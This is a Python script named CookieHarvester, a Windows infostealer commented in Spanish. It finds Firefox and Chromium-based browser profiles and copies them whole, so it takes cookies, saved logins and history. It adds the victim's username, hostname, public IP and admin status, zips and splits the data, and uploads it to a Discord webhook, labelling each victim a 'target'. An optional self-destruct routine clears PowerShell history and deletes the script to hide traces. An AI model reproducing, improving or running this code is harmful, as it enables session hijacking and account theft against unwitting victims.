#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CookieHarvester v5.0.5 - Windows Edition
- Desarrollado por Bankai-HackingDev / C4Bot.
- Probado en Windows 10/11 (22H2+), Server 2022.
- Extrae cookies, credenciales e historial de navegadores.
- Soporte: Firefox, Chrome, Edge, Brave, Opera, Vivaldi.
"""

# ============================================================
#                    IMPORTS Y VERIFICACIÓN
# ============================================================
from dotenv import load_dotenv # Cargar el .env
load_dotenv() # Leer el .env
import os
import sys
import time
import shutil
import zipfile
import tempfile
import subprocess
import socket
import getpass
import glob
import traceback
import ctypes
import sqlite3
import json
from math import ceil
from datetime import datetime
from pathlib import Path

# ------------------------------------------------------------
# Verifica requests (fundamental para exfiltración)
# ------------------------------------------------------------
print("[DEBUG] === VERIFICANDO REQUESTS ===")
try:
    import requests
    REQUESTS_DISPONIBLE = True
    print("[+] Requests SI disponible")
except ImportError:
    REQUESTS_DISPONIBLE = False
    print("[!] Requests NO disponible")

# ============================================================
#                  CONFIGURACIÓN
# ============================================================
VERSION = "v5.0.5"
DISCORD_WEBHOOK_URL = os.getenv("API_Discord")
MAX_SIZE_MB = 8
AUTODESTRUIR = False   # Cambiar a True para producción
SOPORTE_CHROME = True   # Chrome, Edge, Brave, Opera, Vivaldi
SOPORTE_FIREFOX = True

# ============================================================
# Funciones de utilidad para Windows
# ============================================================
if not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")
    
def is_admin():
    """Verifica si el script se ejecuta como administrador"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def obtener_ip_publica():
    """Obtiene IP pública con timeout"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "No disponible"

def navegador_abierto(nombre_proceso):
    """Verifica si un proceso está en ejecución (Windows)"""
    try:
        resultado = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {nombre_proceso}'],
            capture_output=True, text=True, shell=True
        )
        return nombre_proceso in resultado.stdout
    except:
        return False

def detectar_navegadores_abiertos():
    """Detecta navegadores abiertos en Windows"""
    procesos = {
        'firefox.exe': 'Firefox',
        'chrome.exe': 'Chrome',
        'msedge.exe': 'Edge',
        'brave.exe': 'Brave',
        'opera.exe': 'Opera',
        'vivaldi.exe': 'Vivaldi'
    }
    abiertos = []
    for proc, nombre in procesos.items():
        if navegador_abierto(proc):
            abiertos.append(nombre)
    return abiertos

# ============================================================
# Localización de perfiles (Windows)
# ============================================================

def encontrar_perfil_firefox():
    """Busca el perfil de Firefox en Windows"""
    base = os.path.expanduser('~')
    rutas = [
        os.path.join(base, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        os.path.join(base, 'AppData', 'Local', 'Mozilla', 'Firefox', 'Profiles')
    ]
    for ruta_base in rutas:
        if not os.path.exists(ruta_base):
            continue
        for perfil in os.listdir(ruta_base):
            if perfil.endswith('.default-release') or perfil.endswith('.default'):
                ruta_perfil = os.path.join(ruta_base, perfil)
                if os.path.exists(os.path.join(ruta_perfil, 'cookies.sqlite')):
                    return ruta_perfil
    return None

def encontrar_perfil_chrome():
    """Busca perfil de Chrome/Edge/Brave/Opera/Vivaldi (basados en Chromium)"""
    if not SOPORTE_CHROME:
        return []
    
    base = os.path.expanduser('~')
    perfiles = []
    
    # Navegadores basados en Chromium
    navegadores = {
        'Chrome': os.path.join(base, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(base, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(base, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(base, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(base, 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default')
    }
    
    for nombre, ruta in navegadores.items():
        if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
            perfiles.append((ruta, nombre))
    return perfiles

# ============================================================
# Copia de carpetas (con manejo de permisos en Windows)
# ============================================================

def copiar_carpeta(origen, destino):
    """Copia una carpeta en Windows (con permisos)"""
    try:
        if os.path.exists(destino):
            shutil.rmtree(destino, ignore_errors=True)
        shutil.copytree(origen, destino, symlinks=False, ignore_dangling_symlinks=True)
        return True
    except Exception as e:
        print(f"    [!] Error copiando: {e}")
        return False

# ============================================================
# Creación de info.txt
# ============================================================

def crear_info_txt(destino, ip_publica, version, navegadores_abiertos, navegador_nombre):
    """Crea info.txt con datos del sistema Windows"""
    with open(destino, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write(f"  CookieHarvester {version} - Windows Edition\n")
        f.write("=" * 50 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform} - {os.name}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(f"Navegadores abiertos: {', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n")
        f.write(f"Admin: {'Sí' if is_admin() else 'No'}\n")

# ============================================================
# Compresión y división en partes (igual que Linux)
# ============================================================

def crear_zip_desde_carpeta(carpeta_origen, zip_destino):
    """Comprime en ZIP (Windows)"""
    with zipfile.ZipFile(zip_destino, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(carpeta_origen):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, carpeta_origen)
                zf.write(full_path, arcname)
    return zip_destino

def dividir_zip_en_partes(zip_path, max_size_mb=8):
    """Divide ZIP en partes de max_size_mb MB"""
    max_bytes = max_size_mb * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    
    if file_size <= max_bytes:
        return [zip_path]
    
    parts = []
    base_name = os.path.splitext(zip_path)[0]
    with open(zip_path, 'rb') as f:
        data = f.read()
    
    total_parts = ceil(file_size / max_bytes)
    for i in range(total_parts):
        part_path = f"{base_name}_part{i+1}.zip"
        with open(part_path, 'wb') as pf:
            pf.write(data[i*max_bytes:(i+1)*max_bytes])
        parts.append(part_path)
    return parts

# ============================================================
# Envío a Discord (similar al original)
# ============================================================

def info_objetivo(webhook_url, version, usuario, equipo, ip_publica, fecha, errores):
    """Envía notificación de nuevo objetivo"""
    try:
        resumen = f"""
===================================================
CookieHarvester {version} - Windows Edition
Nuevo objetivo
===================================================
Usuario: {usuario}
Equipo: {equipo}
IP: {ip_publica}
Fecha: {fecha}
Errores: {'Sí' if errores else 'No'}
"""
        response = requests.post(webhook_url, data={'content': resumen[:1900]}, timeout=10)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[!] Error en info_objetivo: {e}")
        return False

def enviar_a_discord(webhook_url, zip_path, caption=None, intento=1, max_intentos=3):
    """Envía archivo a Discord con reintentos"""
    try:
        if not os.path.exists(zip_path):
            return False
        
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            data = {'content': caption[:1000] if caption else ''}
            response = requests.post(webhook_url, files=files, data=data, timeout=30)
        
        if response.status_code in [200, 204]:
            return True
        elif response.status_code == 429 and intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        else:
            if intento < max_intentos:
                time.sleep(2 ** intento)
                return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
            return False
    except Exception as e:
        print(f"[!] Error en enviar_a_discord: {e}")
        if intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        return False

def enviar_resumen_final(webhook_url, info_dict, perfiles_procesados, total_partes, errores):
    """Envía resumen final de ejecución"""
    try:
        resumen = f"""
===================================================
RESUMEN DE EJECUCIÓN - Windows
===================================================
Usuario: {info_dict['usuario']}
Equipo: {info_dict['equipo']}
IP: {info_dict['ip_publica']}
Fecha: {info_dict['fecha']}
Perfiles: {len(perfiles_procesados)}
Partes enviadas: {total_partes}
Errores: {'Sí' if errores else 'No'}
"""
        response = requests.post(webhook_url, data={'content': resumen[:1900]}, timeout=10)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[!] Error en resumen final: {e}")
        return False

# ============================================================
# Procesamiento de perfil (Windows)
# ============================================================

def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica, navegadores_abiertos):
    """Procesa un perfil completo (copia, comprime, envía)"""
    print(f"\n[DEBUG] === PROCESAR_PERFIL: {nombre_navegador} ===")
    
    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    if not copiar_carpeta(perfil_path, carpeta_copia):
        print(f"[!] Error al copiar perfil de {nombre_navegador}")
        return False

    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, VERSION, navegadores_abiertos, nombre_navegador)

    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_{socket.gethostname()}_{fecha}_{nombre_navegador}"
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    
    crear_zip_desde_carpeta(carpeta_copia, zip_path)
    parts = dividir_zip_en_partes(zip_path, MAX_SIZE_MB)
    
    exitos = 0
    for idx, part in enumerate(parts, 1):
        caption = f"📁 **{nombre_navegador}** - Parte {idx}/{len(parts)} | {nombre_base}"
        if enviar_a_discord(DISCORD_WEBHOOK_URL, part, caption):
            exitos += 1
        time.sleep(1)
    
    return exitos == len(parts)

# ============================================================
# Autodestrucción (Windows)
# ============================================================

def autodestruir_seguro(temp_dir, script_path, mensajes_enviados):
    """Elimina rastros en Windows (archivos, tareas, historial)"""
    try:
        print("\n[*] Iniciando autodestrucción en Windows...")
        
        # 1. Eliminar directorios temporales c4_*
        c4_dirs = glob.glob('C:\\Users\\*\\AppData\\Local\\Temp\\c4_*')
        for c4_dir in c4_dirs:
            if os.path.exists(c4_dir):
                shutil.rmtree(c4_dir, ignore_errors=True)
                print(f"[+] Eliminado: {c4_dir}")
        
        # 2. Eliminar ZIPs y partes
        zips = glob.glob(os.path.join(temp_dir, '*.zip'))
        for z in zips:
            os.remove(z)
            print(f"[+] Eliminado ZIP: {z}")
        
        # 3. Limpiar historial de PowerShell y CMD
        os.system('Clear-History' if os.name == 'nt' else 'history -c')
        os.system('del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul')
        
        # 4. Eliminar el script mismo
        time.sleep(1)
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"[+] Eliminado script: {script_path}")
        
        # 5. Crear tarea programada para eliminar directorio temp al reiniciar (opcional)
        # (Comentado para no dejar rastros)
        
        print("[+] 🧹 Autodestrucción completada en Windows")
        sys.exit(0)
        
    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        sys.exit(1)

# ============================================================
#                     FUNCIÓN PRINCIPAL
# ============================================================

def main():
    print("\n[DEBUG] === INICIO DE MAIN (Windows) ===")
    
    script_path = os.path.abspath(__file__)
    
    if not REQUESTS_DISPONIBLE:
        print("[!] Requests no instalado. Saliendo...")
        sys.exit(1)
    
    print("=" * 60)
    print(f"  CookieHarvester {VERSION} - Windows Edition  ")
    print("=" * 60)
    
    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")
    
    ip_publica = obtener_ip_publica()
    print(f"[+] IP Pública: {ip_publica}")
    
    abiertos = detectar_navegadores_abiertos()
    if abiertos:
        print(f"[+] Navegadores abiertos: {', '.join(abiertos)}")
    else:
        print("[+] No hay navegadores abiertos.")
    
    temp_dir = tempfile.mkdtemp(prefix="c4_")
    print(f"[+] Directorio temporal: {temp_dir}")
    
    # ============================================================
    # Buscar perfiles (Firefox + Chromium)
    # ============================================================
    perfiles = []
    
    if SOPORTE_FIREFOX:
        firefox_path = encontrar_perfil_firefox()
        if firefox_path:
            perfiles.append((firefox_path, "Firefox"))
    
    if SOPORTE_CHROME:
        perfiles.extend(encontrar_perfil_chrome())
    
    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        sys.exit(1)
    
    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")
    
    # ============================================================
    # Ejecución
    # ============================================================
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    errores_globales = False
    
    info_exitoso = info_objetivo(
        DISCORD_WEBHOOK_URL,
        VERSION,
        usuario,
        equipo,
        ip_publica,
        fecha,
        errores_globales
    )
    
    perfiles_procesados = []
    total_partes = 0
    
    for perfil_path, nombre in perfiles:
        exito = procesar_perfil(perfil_path, nombre, temp_dir, ip_publica, abiertos)
        if not exito:
            errores_globales = True
        perfiles_procesados.append({'nombre': nombre, 'partes': 1})
        total_partes += 1
    
    info_dict = {
        'usuario': usuario,
        'equipo': equipo,
        'ip_publica': ip_publica,
        'fecha': fecha
    }
    
    resumen_exitoso = enviar_resumen_final(
        DISCORD_WEBHOOK_URL,
        info_dict,
        perfiles_procesados,
        total_partes,
        errores_globales
    )
    
    # ============================================================
    # Autodestrucción
    # ============================================================
    if AUTODESTRUIR:
        mensajes_enviados = {
            'objetivo_nuevo': info_exitoso,
            'resumen_final': resumen_exitoso
        }
        autodestruir_seguro(temp_dir, script_path, mensajes_enviados)
    else:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        print("\n[+] Limpieza completada (sin autodestrucción).")
        print("=" * 60)

if __name__ == "__main__":
    main()